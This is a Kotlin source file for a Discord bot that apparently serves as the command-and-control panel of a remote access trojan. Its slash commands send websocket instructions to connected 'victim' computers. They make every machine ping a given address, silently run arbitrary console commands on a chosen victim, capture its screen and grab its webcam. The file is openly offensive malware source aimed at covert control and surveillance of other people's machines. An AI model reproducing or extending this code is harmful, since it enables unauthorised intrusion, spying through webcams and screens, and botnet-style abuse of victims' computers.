package bot.commands

import bot.StatusChannel
import dev.kord.x.emoji.Emojis
import jdk.jshell.Snippet.Status
import me.jakejmattson.discordkt.arguments.AnyArg
import me.jakejmattson.discordkt.arguments.ChoiceArg
import me.jakejmattson.discordkt.commands.commands
import websocket.Application

fun remote() = commands("Remote Actions") {
    slash("request", "Every computers ping the given ip address/domain") {
        execute(AnyArg("address", "The address to ping")) {
            val address = args.first

            // TODO: Serialized Frame handling
            //  - proper instruction validation
            //  - typed s-object requests
            Application.sendAll("ping:$address")

        }
    }

    slash("run", "Silently run a console command on the victim's computer") {
        execute(AnyArg("command", "The command to run"), ChoiceArg("victim", "The online victim", *StatusChannel.status.filter { it.value }.keys.toTypedArray())) {
            val (command, victim) = args

            // TODO: Serialized Frame handling
            Application.send(victim, "run:$command")
        }
    }

    slash("screen", "Take a screenshot of the victim's computer screen and send it") {
        execute(ChoiceArg("victim", "The online victim", *StatusChannel.status.filter { it.value }.keys.toTypedArray())) {
            val victim = args.first
            Application.send(victim, "screenshot")
        }
    }

    slash("webcam", "Take a webcam capture from the victim and send it") {
        execute(ChoiceArg("victim", "The online victim", *StatusChannel.status.filter { it.value }.keys.toTypedArray())) {
            val victim = args.first
            respondMenu {
                page { title = "Are you sure?" }

                buttons {
                    button("Confirm", null) {
                        Application.send(victim, "webcam")
                    }
                }
            }
        }
    }

}